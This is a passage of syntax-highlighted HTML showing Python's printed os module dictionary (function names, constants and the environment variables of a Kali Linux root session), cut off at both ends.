class="string">'RTLD_LAZY'</span>, <span class="string">'RTLD_LOCAL'</span>, <span class="string">'RTLD_NODELETE'</span>, <span class="string">'RTLD_NOLOAD'</span>, <span class="string">'RTLD_NOW'</span>, <span class="string">'RWF_DSYNC'</span>, <span class="string">'RWF_HIPRI'</span>, <span class="string">'RWF_NOWAIT'</span>, <span class="string">'RWF_SYNC'</span>, <span class="string">'R_OK'</span>, <span class="string">'SCHED_BATCH'</span>, <span class="string">'SCHED_FIFO'</span>, <span class="string">'SCHED_IDLE'</span>, <span class="string">'SCHED_OTHER'</span>, <span class="string">'SCHED_RESET_ON_FORK'</span>, <span class="string">'SCHED_RR'</span>, <span class="string">'SEEK_DATA'</span>, <span class="string">'SEEK_HOLE'</span>, <span class="string">'ST_APPEND'</span>, <span class="string">'ST_MANDLOCK'</span>, <span class="string">'ST_NOATIME'</span>, <span class="string">'ST_NODEV'</span>, <span class="string">'ST_NODIRATIME'</span>, <span class="string">'ST_NOEXEC'</span>, <span class="string">'ST_NOSUID'</span>, <span class="string">'ST_RDONLY'</span>, <span class="string">'ST_RELATIME'</span>, <span class="string">'ST_SYNCHRONOUS'</span>, <span class="string">'ST_WRITE'</span>, <span class="string">'TMP_MAX'</span>, <span class="string">'WCONTINUED'</span>, <span class="string">'WCOREDUMP'</span>, <span class="string">'WEXITED'</span>, <span class="string">'WEXITSTATUS'</span>, <span class="string">'WIFCONTINUED'</span>, <span class="string">'WIFEXITED'</span>, <span class="string">'WIFSIGNALED'</span>, <span class="string">'WIFSTOPPED'</span>, <span class="string">'WNOHANG'</span>, <span class="string">'WNOWAIT'</span>, <span class="string">'WSTOPPED'</span>, <span class="string">'WSTOPSIG'</span>, <span class="string">'WTERMSIG'</span>, <span class="string">'WUNTRACED'</span>, <span class="string">'W_OK'</span>, <span class="string">'XATTR_CREATE'</span>, <span class="string">'XATTR_REPLACE'</span>, <span class="string">'XATTR_SIZE_MAX'</span>, <span class="string">'X_OK'</span>, <span class="string">'abort'</span>, <span class="string">'access'</span>, <span class="string">'chdir'</span>, <span class="string">'chmod'</span>, <span class="string">'chown'</span>, <span class="string">'chroot'</span>, <span class="string">'close'</span>, <span class="string">'closerange'</span>, <span class="string">'confstr'</span>, <span class="string">'confstr_names'</span>, <span class="string">'copy_file_range'</span>, <span class="string">'cpu_count'</span>, <span class="string">'ctermid'</span>, <span class="string">'device_encoding'</span>, <span class="string">'dup'</span>, <span class="string">'dup2'</span>, <span class="string">'environ'</span>, <span class="string">'error'</span>, <span class="string">'execv'</span>, <span class="string">'execve'</span>, <span class="string">'fchdir'</span>, <span class="string">'fchmod'</span>, <span class="string">'fchown'</span>, <span class="string">'fdatasync'</span>, <span class="string">'fork'</span>, <span class="string">'forkpty'</span>, <span class="string">'fpathconf'</span>, <span class="string">'fspath'</span>, <span class="string">'fstat'</span>, <span class="string">'fstatvfs'</span>, <span class="string">'fsync'</span>, <span class="string">'ftruncate'</span>, <span class="string">'get_blocking'</span>, <span class="string">'get_inheritable'</span>, <span class="string">'get_terminal_size'</span>, <span class="string">'getcwd'</span>, <span class="string">'getcwdb'</span>, <span class="string">'getegid'</span>, <span class="string">'geteuid'</span>, <span class="string">'getgid'</span>, <span class="string">'getgrouplist'</span>, <span class="string">'getgroups'</span>, <span class="string">'getloadavg'</span>, <span class="string">'getlogin'</span>, <span class="string">'getpgid'</span>, <span class="string">'getpgrp'</span>, <span class="string">'getpid'</span>, <span class="string">'getppid'</span>, <span class="string">'getpriority'</span>, <span class="string">'getrandom'</span>, <span class="string">'getresgid'</span>, <span class="string">'getresuid'</span>, <span class="string">'getsid'</span>, <span class="string">'getuid'</span>, <span class="string">'getxattr'</span>, <span class="string">'initgroups'</span>, <span class="string">'isatty'</span>, <span class="string">'kill'</span>, <span class="string">'killpg'</span>, <span class="string">'lchown'</span>, <span class="string">'link'</span>, <span class="string">'listdir'</span>, <span class="string">'listxattr'</span>, <span class="string">'lockf'</span>, <span class="string">'lseek'</span>, <span class="string">'lstat'</span>, <span class="string">'major'</span>, <span class="string">'makedev'</span>, <span class="string">'memfd_create'</span>, <span class="string">'minor'</span>, <span class="string">'mkdir'</span>, <span class="string">'mkfifo'</span>, <span class="string">'mknod'</span>, <span class="string">'nice'</span>, <span class="string">'open'</span>, <span class="string">'openpty'</span>, <span class="string">'pathconf'</span>, <span class="string">'pathconf_names'</span>, <span class="string">'pidfd_open'</span>, <span class="string">'pipe'</span>, <span class="string">'pipe2'</span>, <span class="string">'posix_fadvise'</span>, <span class="string">'posix_fallocate'</span>, <span class="string">'posix_spawn'</span>, <span class="string">'posix_spawnp'</span>, <span class="string">'pread'</span>, <span class="string">'preadv'</span>, <span class="string">'putenv'</span>, <span class="string">'pwrite'</span>, <span class="string">'pwritev'</span>, <span class="string">'read'</span>, <span class="string">'readlink'</span>, <span class="string">'readv'</span>, <span class="string">'register_at_fork'</span>, <span class="string">'remove'</span>, <span class="string">'removexattr'</span>, <span class="string">'rename'</span>, <span class="string">'replace'</span>, <span class="string">'rmdir'</span>, <span class="string">'scandir'</span>, <span class="string">'sched_get_priority_max'</span>, <span class="string">'sched_get_priority_min'</span>, <span class="string">'sched_getaffinity'</span>, <span class="string">'sched_getparam'</span>, <span class="string">'sched_getscheduler'</span>, <span class="string">'sched_param'</span>, <span class="string">'sched_rr_get_interval'</span>, <span class="string">'sched_setaffinity'</span>, <span class="string">'sched_setparam'</span>, <span class="string">'sched_setscheduler'</span>, <span class="string">'sched_yield'</span>, <span class="string">'sendfile'</span>, <span class="string">'set_blocking'</span>, <span class="string">'set_inheritable'</span>, <span class="string">'setegid'</span>, <span class="string">'seteuid'</span>, <span class="string">'setgid'</span>, <span class="string">'setgroups'</span>, <span class="string">'setpgid'</span>, <span class="string">'setpgrp'</span>, <span class="string">'setpriority'</span>, <span class="string">'setregid'</span>, <span class="string">'setresgid'</span>, <span class="string">'setresuid'</span>, <span class="string">'setreuid'</span>, <span class="string">'setsid'</span>, <span class="string">'setuid'</span>, <span class="string">'setxattr'</span>, <span class="string">'stat'</span>, <span class="string">'stat_result'</span>, <span class="string">'statvfs'</span>, <span class="string">'statvfs_result'</span>, <span class="string">'strerror'</span>, <span class="string">'symlink'</span>, <span class="string">'sync'</span>, <span class="string">'sysconf'</span>, <span class="string">'sysconf_names'</span>, <span class="string">'system'</span>, <span class="string">'tcgetpgrp'</span>, <span class="string">'tcsetpgrp'</span>, <span class="string">'terminal_size'</span>, <span class="string">'times'</span>, <span class="string">'times_result'</span>, <span class="string">'truncate'</span>, <span class="string">'ttyname'</span>, <span class="string">'umask'</span>, <span class="string">'uname'</span>, <span class="string">'uname_result'</span>, <span class="string">'unlink'</span>, <span class="string">'unsetenv'</span>, <span class="string">'urandom'</span>, <span class="string">'utime'</span>, <span class="string">'wait'</span>, <span class="string">'wait3'</span>, <span class="string">'wait4'</span>, <span class="string">'waitid'</span>, <span class="string">'waitid_result'</span>, <span class="string">'waitpid'</span>, <span class="string">'waitstatus_to_exitcode'</span>, <span class="string">'write'</span>, <span class="string">'writev'</span>, <span class="string">'makedirs'</span>, <span class="string">'removedirs'</span>, <span class="string">'renames'</span>, <span class="string">'walk'</span>, <span class="string">'fwalk'</span>, <span class="string">'execl'</span>, <span class="string">'execle'</span>, <span class="string">'execlp'</span>, <span class="string">'execlpe'</span>, <span class="string">'execvp'</span>, <span class="string">'execvpe'</span>, <span class="string">'getenv'</span>, <span class="string">'supports_bytes_environ'</span>, <span class="string">'environb'</span>, <span class="string">'getenvb'</span>, <span class="string">'P_WAIT'</span>, <span class="string">'P_NOWAIT'</span>, <span class="string">'P_NOWAITO'</span>, <span class="string">'spawnv'</span>, <span class="string">'spawnve'</span>, <span class="string">'spawnvp'</span>, <span class="string">'spawnvpe'</span>, <span class="string">'spawnl'</span>, <span class="string">'spawnle'</span>, <span class="string">'spawnlp'</span>, <span class="string">'spawnlpe'</span>], <span class="string">'_exists'</span>: &lt;function _exists at <span class="number">0x7fc7ef5478b0</span>&gt;, <span class="string">'_get_exports_list'</span>: &lt;function _get_exports_list at <span class="number">0x7fc7ef547ca0</span>&gt;, <span class="string">'name'</span>: <span class="string">'posix'</span>, <span class="string">'linesep'</span>: <span class="string">'\n'</span>, <span class="string">'stat'</span>: &lt;built-<span class="keyword">in</span> function stat&gt;, <span class="string">'access'</span>: &lt;built-<span class="keyword">in</span> function access&gt;, <span class="string">'ttyname'</span>: &lt;built-<span class="keyword">in</span> function ttyname&gt;, <span class="string">'chdir'</span>: &lt;built-<span class="keyword">in</span> function chdir&gt;, <span class="string">'chmod'</span>: &lt;built-<span class="keyword">in</span> function chmod&gt;, <span class="string">'fchmod'</span>: &lt;built-<span class="keyword">in</span> function fchmod&gt;, <span class="string">'chown'</span>: &lt;built-<span class="keyword">in</span> function chown&gt;, <span class="string">'fchown'</span>: &lt;built-<span class="keyword">in</span> function fchown&gt;, <span class="string">'lchown'</span>: &lt;built-<span class="keyword">in</span> function lchown&gt;, <span class="string">'chroot'</span>: &lt;built-<span class="keyword">in</span> function chroot&gt;, <span class="string">'ctermid'</span>: &lt;built-<span class="keyword">in</span> function ctermid&gt;, <span class="string">'getcwd'</span>: &lt;built-<span class="keyword">in</span> function getcwd&gt;, <span class="string">'getcwdb'</span>: &lt;built-<span class="keyword">in</span> function getcwdb&gt;, <span class="string">'link'</span>: &lt;built-<span class="keyword">in</span> function link&gt;, <span class="string">'listdir'</span>: &lt;built-<span class="keyword">in</span> function listdir&gt;, <span class="string">'lstat'</span>: &lt;built-<span class="keyword">in</span> function lstat&gt;, <span class="string">'mkdir'</span>: &lt;built-<span class="keyword">in</span> function mkdir&gt;, <span class="string">'nice'</span>: &lt;built-<span class="keyword">in</span> function nice&gt;, <span class="string">'getpriority'</span>: &lt;built-<span class="keyword">in</span> function getpriority&gt;, <span class="string">'setpriority'</span>: &lt;built-<span class="keyword">in</span> function setpriority&gt;, <span class="string">'posix_spawn'</span>: &lt;built-<span class="keyword">in</span> function posix_spawn&gt;, <span class="string">'posix_spawnp'</span>: &lt;built-<span class="keyword">in</span> function posix_spawnp&gt;, <span class="string">'readlink'</span>: &lt;built-<span class="keyword">in</span> function readlink&gt;, <span class="string">'copy_file_range'</span>: &lt;built-<span class="keyword">in</span> function copy_file_range&gt;, <span class="string">'rename'</span>: &lt;built-<span class="keyword">in</span> function rename&gt;, <span class="string">'replace'</span>: &lt;built-<span class="keyword">in</span> function replace&gt;, <span class="string">'rmdir'</span>: &lt;built-<span class="keyword">in</span> function rmdir&gt;, <span class="string">'symlink'</span>: &lt;built-<span class="keyword">in</span> function symlink&gt;, <span class="string">'system'</span>: &lt;built-<span class="keyword">in</span> function system&gt;, <span class="string">'umask'</span>: &lt;built-<span class="keyword">in</span> function umask&gt;, <span class="string">'uname'</span>: &lt;built-<span class="keyword">in</span> function uname&gt;, <span class="string">'unlink'</span>: &lt;built-<span class="keyword">in</span> function unlink&gt;, <span class="string">'remove'</span>: &lt;built-<span class="keyword">in</span> function remove&gt;, <span class="string">'utime'</span>: &lt;built-<span class="keyword">in</span> function utime&gt;, <span class="string">'times'</span>: &lt;built-<span class="keyword">in</span> function times&gt;, <span class="string">'execv'</span>: &lt;built-<span class="keyword">in</span> function execv&gt;, <span class="string">'execve'</span>: &lt;built-<span class="keyword">in</span> function execve&gt;, <span class="string">'fork'</span>: &lt;built-<span class="keyword">in</span> function fork&gt;, <span class="string">'register_at_fork'</span>: &lt;built-<span class="keyword">in</span> function register_at_fork&gt;, <span class="string">'sched_get_priority_max'</span>: &lt;built-<span class="keyword">in</span> function sched_get_priority_max&gt;, <span class="string">'sched_get_priority_min'</span>: &lt;built-<span class="keyword">in</span> function sched_get_priority_min&gt;, <span class="string">'sched_getparam'</span>: &lt;built-<span class="keyword">in</span> function sched_getparam&gt;, <span class="string">'sched_getscheduler'</span>: &lt;built-<span class="keyword">in</span> function sched_getscheduler&gt;, <span class="string">'sched_rr_get_interval'</span>: &lt;built-<span class="keyword">in</span> function sched_rr_get_interval&gt;, <span class="string">'sched_setparam'</span>: &lt;built-<span class="keyword">in</span> function sched_setparam&gt;, <span class="string">'sched_setscheduler'</span>: &lt;built-<span class="keyword">in</span> function sched_setscheduler&gt;, <span class="string">'sched_yield'</span>: &lt;built-<span class="keyword">in</span> function sched_yield&gt;, <span class="string">'sched_setaffinity'</span>: &lt;built-<span class="keyword">in</span> function sched_setaffinity&gt;, <span class="string">'sched_getaffinity'</span>: &lt;built-<span class="keyword">in</span> function sched_getaffinity&gt;, <span class="string">'openpty'</span>: &lt;built-<span class="keyword">in</span> function openpty&gt;, <span class="string">'forkpty'</span>: &lt;built-<span class="keyword">in</span> function forkpty&gt;, <span class="string">'getegid'</span>: &lt;built-<span class="keyword">in</span> function getegid&gt;, <span class="string">'geteuid'</span>: &lt;built-<span class="keyword">in</span> function geteuid&gt;, <span class="string">'getgid'</span>: &lt;built-<span class="keyword">in</span> function getgid&gt;, <span class="string">'getgrouplist'</span>: &lt;built-<span class="keyword">in</span> function getgrouplist&gt;, <span class="string">'getgroups'</span>: &lt;built-<span class="keyword">in</span> function getgroups&gt;, <span class="string">'getpid'</span>: &lt;built-<span class="keyword">in</span> function getpid&gt;, <span class="string">'getpgrp'</span>: &lt;built-<span class="keyword">in</span> function getpgrp&gt;, <span class="string">'getppid'</span>: &lt;built-<span class="keyword">in</span> function getppid&gt;, <span class="string">'getuid'</span>: &lt;built-<span class="keyword">in</span> function getuid&gt;, <span class="string">'getlogin'</span>: &lt;built-<span class="keyword">in</span> function getlogin&gt;, <span class="string">'kill'</span>: &lt;built-<span class="keyword">in</span> function kill&gt;, <span class="string">'killpg'</span>: &lt;built-<span class="keyword">in</span> function killpg&gt;, <span class="string">'setuid'</span>: &lt;built-<span class="keyword">in</span> function setuid&gt;, <span class="string">'seteuid'</span>: &lt;built-<span class="keyword">in</span> function seteuid&gt;, <span class="string">'setreuid'</span>: &lt;built-<span class="keyword">in</span> function setreuid&gt;, <span class="string">'setgid'</span>: &lt;built-<span class="keyword">in</span> function setgid&gt;, <span class="string">'setegid'</span>: &lt;built-<span class="keyword">in</span> function setegid&gt;, <span class="string">'setregid'</span>: &lt;built-<span class="keyword">in</span> function setregid&gt;, <span class="string">'setgroups'</span>: &lt;built-<span class="keyword">in</span> function setgroups&gt;, <span class="string">'initgroups'</span>: &lt;built-<span class="keyword">in</span> function initgroups&gt;, <span class="string">'getpgid'</span>: &lt;built-<span class="keyword">in</span> function getpgid&gt;, <span class="string">'setpgrp'</span>: &lt;built-<span class="keyword">in</span> function setpgrp&gt;, <span class="string">'wait'</span>: &lt;built-<span class="keyword">in</span> function wait&gt;, <span class="string">'wait3'</span>: &lt;built-<span class="keyword">in</span> function wait3&gt;, <span class="string">'wait4'</span>: &lt;built-<span class="keyword">in</span> function wait4&gt;, <span class="string">'waitid'</span>: &lt;built-<span class="keyword">in</span> function waitid&gt;, <span class="string">'waitpid'</span>: &lt;built-<span class="keyword">in</span> function waitpid&gt;, <span class="string">'pidfd_open'</span>: &lt;built-<span class="keyword">in</span> function pidfd_open&gt;, <span class="string">'getsid'</span>: &lt;built-<span class="keyword">in</span> function getsid&gt;, <span class="string">'setsid'</span>: &lt;built-<span class="keyword">in</span> function setsid&gt;, <span class="string">'setpgid'</span>: &lt;built-<span class="keyword">in</span> function setpgid&gt;, <span class="string">'tcgetpgrp'</span>: &lt;built-<span class="keyword">in</span> function tcgetpgrp&gt;, <span class="string">'tcsetpgrp'</span>: &lt;built-<span class="keyword">in</span> function tcsetpgrp&gt;, <span class="string">'open'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">open</span>&gt;, <span class="string">'close'</span>: &lt;built-<span class="keyword">in</span> function close&gt;, <span class="string">'closerange'</span>: &lt;built-<span class="keyword">in</span> function closerange&gt;, <span class="string">'device_encoding'</span>: &lt;built-<span class="keyword">in</span> function device_encoding&gt;, <span class="string">'dup'</span>: &lt;built-<span class="keyword">in</span> function dup&gt;, <span class="string">'dup2'</span>: &lt;built-<span class="keyword">in</span> function dup2&gt;, <span class="string">'lockf'</span>: &lt;built-<span class="keyword">in</span> function lockf&gt;, <span class="string">'lseek'</span>: &lt;built-<span class="keyword">in</span> function lseek&gt;, <span class="string">'read'</span>: &lt;built-<span class="keyword">in</span> function read&gt;, <span class="string">'readv'</span>: &lt;built-<span class="keyword">in</span> function readv&gt;, <span class="string">'pread'</span>: &lt;built-<span class="keyword">in</span> function pread&gt;, <span class="string">'preadv'</span>: &lt;built-<span class="keyword">in</span> function preadv&gt;, <span class="string">'write'</span>: &lt;built-<span class="keyword">in</span> function write&gt;, <span class="string">'writev'</span>: &lt;built-<span class="keyword">in</span> function writev&gt;, <span class="string">'pwrite'</span>: &lt;built-<span class="keyword">in</span> function pwrite&gt;, <span class="string">'pwritev'</span>: &lt;built-<span class="keyword">in</span> function pwritev&gt;, <span class="string">'sendfile'</span>: &lt;built-<span class="keyword">in</span> function sendfile&gt;, <span class="string">'fstat'</span>: &lt;built-<span class="keyword">in</span> function fstat&gt;, <span class="string">'isatty'</span>: &lt;built-<span class="keyword">in</span> function isatty&gt;, <span class="string">'pipe'</span>: &lt;built-<span class="keyword">in</span> function pipe&gt;, <span class="string">'pipe2'</span>: &lt;built-<span class="keyword">in</span> function pipe2&gt;, <span class="string">'mkfifo'</span>: &lt;built-<span class="keyword">in</span> function mkfifo&gt;, <span class="string">'mknod'</span>: &lt;built-<span class="keyword">in</span> function mknod&gt;, <span class="string">'major'</span>: &lt;built-<span class="keyword">in</span> function major&gt;, <span class="string">'minor'</span>: &lt;built-<span class="keyword">in</span> function minor&gt;, <span class="string">'makedev'</span>: &lt;built-<span class="keyword">in</span> function makedev&gt;, <span class="string">'ftruncate'</span>: &lt;built-<span class="keyword">in</span> function ftruncate&gt;, <span class="string">'truncate'</span>: &lt;built-<span class="keyword">in</span> function truncate&gt;, <span class="string">'posix_fallocate'</span>: &lt;built-<span class="keyword">in</span> function posix_fallocate&gt;, <span class="string">'posix_fadvise'</span>: &lt;built-<span class="keyword">in</span> function posix_fadvise&gt;, <span class="string">'putenv'</span>: &lt;built-<span class="keyword">in</span> function putenv&gt;, <span class="string">'unsetenv'</span>: &lt;built-<span class="keyword">in</span> function unsetenv&gt;, <span class="string">'strerror'</span>: &lt;built-<span class="keyword">in</span> function strerror&gt;, <span class="string">'fchdir'</span>: &lt;built-<span class="keyword">in</span> function fchdir&gt;, <span class="string">'fsync'</span>: &lt;built-<span class="keyword">in</span> function fsync&gt;, <span class="string">'sync'</span>: &lt;built-<span class="keyword">in</span> function sync&gt;, <span class="string">'fdatasync'</span>: &lt;built-<span class="keyword">in</span> function fdatasync&gt;, <span class="string">'WCOREDUMP'</span>: &lt;built-<span class="keyword">in</span> function WCOREDUMP&gt;, <span class="string">'WIFCONTINUED'</span>: &lt;built-<span class="keyword">in</span> function WIFCONTINUED&gt;, <span class="string">'WIFSTOPPED'</span>: &lt;built-<span class="keyword">in</span> function WIFSTOPPED&gt;, <span class="string">'WIFSIGNALED'</span>: &lt;built-<span class="keyword">in</span> function WIFSIGNALED&gt;, <span class="string">'WIFEXITED'</span>: &lt;built-<span class="keyword">in</span> function WIFEXITED&gt;, <span class="string">'WEXITSTATUS'</span>: &lt;built-<span class="keyword">in</span> function WEXITSTATUS&gt;, <span class="string">'WTERMSIG'</span>: &lt;built-<span class="keyword">in</span> function WTERMSIG&gt;, <span class="string">'WSTOPSIG'</span>: &lt;built-<span class="keyword">in</span> function WSTOPSIG&gt;, <span class="string">'fstatvfs'</span>: &lt;built-<span class="keyword">in</span> function fstatvfs&gt;, <span class="string">'statvfs'</span>: &lt;built-<span class="keyword">in</span> function statvfs&gt;, <span class="string">'confstr'</span>: &lt;built-<span class="keyword">in</span> function confstr&gt;, <span class="string">'sysconf'</span>: &lt;built-<span class="keyword">in</span> function sysconf&gt;, <span class="string">'fpathconf'</span>: &lt;built-<span class="keyword">in</span> function fpathconf&gt;, <span class="string">'pathconf'</span>: &lt;built-<span class="keyword">in</span> function pathconf&gt;, <span class="string">'abort'</span>: &lt;built-<span class="keyword">in</span> function abort&gt;, <span class="string">'getloadavg'</span>: &lt;built-<span class="keyword">in</span> function getloadavg&gt;, <span class="string">'urandom'</span>: &lt;built-<span class="keyword">in</span> function urandom&gt;, <span class="string">'setresuid'</span>: &lt;built-<span class="keyword">in</span> function setresuid&gt;, <span class="string">'setresgid'</span>: &lt;built-<span class="keyword">in</span> function setresgid&gt;, <span class="string">'getresuid'</span>: &lt;built-<span class="keyword">in</span> function getresuid&gt;, <span class="string">'getresgid'</span>: &lt;built-<span class="keyword">in</span> function getresgid&gt;, <span class="string">'getxattr'</span>: &lt;built-<span class="keyword">in</span> function getxattr&gt;, <span class="string">'setxattr'</span>: &lt;built-<span class="keyword">in</span> function setxattr&gt;, <span class="string">'removexattr'</span>: &lt;built-<span class="keyword">in</span> function removexattr&gt;, <span class="string">'listxattr'</span>: &lt;built-<span class="keyword">in</span> function listxattr&gt;, <span class="string">'get_terminal_size'</span>: &lt;built-<span class="keyword">in</span> function get_terminal_size&gt;, <span class="string">'cpu_count'</span>: &lt;built-<span class="keyword">in</span> function cpu_count&gt;, <span class="string">'get_inheritable'</span>: &lt;built-<span class="keyword">in</span> function get_inheritable&gt;, <span class="string">'set_inheritable'</span>: &lt;built-<span class="keyword">in</span> function set_inheritable&gt;, <span class="string">'get_blocking'</span>: &lt;built-<span class="keyword">in</span> function get_blocking&gt;, <span class="string">'set_blocking'</span>: &lt;built-<span class="keyword">in</span> function set_blocking&gt;, <span class="string">'scandir'</span>: &lt;built-<span class="keyword">in</span> function scandir&gt;, <span class="string">'fspath'</span>: &lt;built-<span class="keyword">in</span> function fspath&gt;, <span class="string">'getrandom'</span>: &lt;built-<span class="keyword">in</span> function getrandom&gt;, <span class="string">'memfd_create'</span>: &lt;built-<span class="keyword">in</span> function memfd_create&gt;, <span class="string">'waitstatus_to_exitcode'</span>: &lt;built-<span class="keyword">in</span> function waitstatus_to_exitcode&gt;, <span class="string">'environ'</span>: environ({<span class="string">'COLORTERM'</span>: <span class="string">'truecolor'</span>, <span class="string">'DISPLAY'</span>: <span class="string">':0.0'</span>, <span class="string">'LANG'</span>: <span class="string">'en_US.UTF-8'</span>, <span class="string">'LANGUAGE'</span>: <span class="string">''</span>, <span class="string">'PATH'</span>: <span class="string">'/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games'</span>, <span class="string">'TERM'</span>: <span class="string">'xterm-256color'</span>, <span class="string">'XAUTHORITY'</span>: <span class="string">'/home/kali/.Xauthority'</span>, <span class="string">'LS_COLORS'</span>: <span class="string">'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36::ow=30;44:'</span>, <span class="string">'MAIL'</span>: <span class="string">'/var/mail/root'</span>, <span class="string">'LOGNAME'</span>: <span class="string">'root'</span>, <span class="string">'USER'</span>: <span class="string">'root'</span>, <span class="string">'HOME'</span>: <span class="string">'/root'</span>, <span class="string">'SHELL'</span>: <span class="string">'/usr/bin/zsh'</span>, <span class="string">'SUDO_COMMAND'</span>: <span class="string">'/usr/bin/su'</span>, <span class="string">'SUDO_USER'</span>: <span class="string">'kali'</span>, <span class="string">'SUDO_UID'</span>: <span class="string">'1000'</span>, <span class="string">'SUDO_GID'</span>: <span class="string">'1000'</span>, <span class="string">'COMMAND_NOT_FOUND_INSTALL_PROMPT'</span>: <span class="string">'1'</span>, <span class="string">'POWERSHELL_UPDATECHECK'</span>: <span class="string">'Off'</span>, <span class="string">'POWERSHELL_TELEMETRY_OPTOUT'</span>: <span class="string">'1'</span>, <span class="string">'DOTNET_CLI_TELEMETRY_OPTOUT'</span>: <span class="string">'1'</span>, <span class="string">'SHLVL'</span>: <span class="string">'1'</span>, <span class="string">'PWD'</span>: <span class="string">'/home/kali/Desktop'</span>, <span class="string">'OLDPWD'</span>: <span class="string">'/home/kali'</span>, <span class="string">'LESS_TERMCAP_mb'</span>: <span class="string">'\x1b[1;31m'</span>, <span class="string">'LESS_TERMCAP_md'</span>: <span class="string">'\x1b[1;36m'</span>, <span class="string">'LESS_TERMCAP_me'</span>: <span class="string">'\x1b[0m'</span>, <span class="string">'LESS_TERMCAP_so'</span>: <span class="string">'\x1b[01;33m'</span>, <span class="string">'LESS_TERMCAP_se'</span>: <span class="string">'\x1b[0m'</span>, <span class="string">'LESS_TERMCAP_us'</span>: <span class="string">'\x1b[1;32m'</span>, <span class="string">'LESS_TERMCAP_ue'</span>: <span class="string">'\x1b[0m'</span>, <span class="string">'_'</span>: <span class="string">'/usr/bin/python3'</span>}), <span class="string">'F_OK'</span>: <span class="number">0</span>, <span class="string">'R_OK'</span>: <span class="number">4</span>, <span class="string">'W_OK'</span>: <span class="number">2</span>, <span class="string">'X_OK'</span>: <span class="number">1</span>, <span class="string">'NGROUPS_MAX'</span>: <span class="number">65536</span>, <span class="string">'TMP_MAX'</span>: <span class="number">238328</span>, <span class="string">'WCONTINUED'</span>: <span class="number">8</span>, <span class="string">'WNOHANG'</span>: <span class="number">1</span>, <span class="string">'WUNTRACED'</span>: <span class="number">2</span>, <span class="string">'O_RDONLY'</span>: <span class="number">0</span>, <span class="string">'O_WRONLY'</span>: <span class="number">1</span>, <span class="string">'O_RDWR'</span>: <span class="number">2</span>, <span class="string">'O_NDELAY'</span>: <span class="number">2048</span>, <span class="string">'O_NONBLOCK'</span>: <span class="number">2048</span>, <span class="string">'O_APPEND'</span>: <span class="number">1024</span>, <span class="string">'O_DSYNC'</span>: <span class="number">4096</span>, <span class="string">'O_RSYNC'</span>: <span class="number">1052672</span>, <span class="string">'O_SYNC'</span>: <span class="number">1052672</span>, <span class="string">'O_NOCTTY'</span>: <span class="number">256</span>, <span class="string">'O_CREAT'</span>: <span class="number">64</span>, <span class="string">'O_EXCL'</span>: <span class="number">128</span>, <span class="string">'O_TRUNC'</span>: <span class="number">512</span>, <span class="string">'O_LARGEFILE'</span>: <span class="number">0</span>, <span class="string">'O_PATH'</span>: <span class="number">2097152</span>, <span class="string">'O_TMPFILE'</span>: <span class="number">4259840</span>, <span class="string">'PRIO_PROCESS'</span>: <span class="number">0</span>, <span class="string">'PRIO_PGRP'</span>: <span class="number">1</span>, <span class="string">'PRIO_USER'</span>: <span class="number">2</span>, <span class="string">'O_CLOEXEC'</span>: <span class="number">524288</span>, <span class="string">'O_ACCMODE'</span>: <span class="number">3</span>, <span class="string">'SEEK_HOLE'</span>: <span class="number">4</span>, <span class="string">'SEEK_DATA'</span>: <span class="number">3</span>, <span class="string">'O_ASYNC'</span>: <span class="number">8192</span>, <span class="string">'O_DIRECT'</span>: <span class="number">16384</span>, <span class="string">'O_DIRECTORY'</span>: <span class="number">65536</span>, <span class="string">'O_NOFOLLOW'</span>: <span class="number">131072</span>, <span class="string">'O_NOATIME'</span>: <span class="number">262144</span>, <span class="string">'EX_OK'</span>: <span class="number">0</span>, <span class="string">'EX_USAGE'</span>: <span class="number">64</span>, <span class="string">'EX_DATAERR'</span>: <span class="number">65</span>, <span class="string">'EX_NOINPUT'</span>: <span class="number">66</span>, <span class="string">'EX_NOUSER'</span>: <span class="number">67</span>, <span class="string">'EX_NOHOST'</span>: <span class="number">68</span>, <span class="string">'EX_UNAVAILABLE'</span>: <span class="number">69</span>, <span class="string">'EX_SOFTWARE'</span>: <span class="number">70</span>, <span class="string">'EX_OSERR'</span>: <span class="number">71</span>, <span 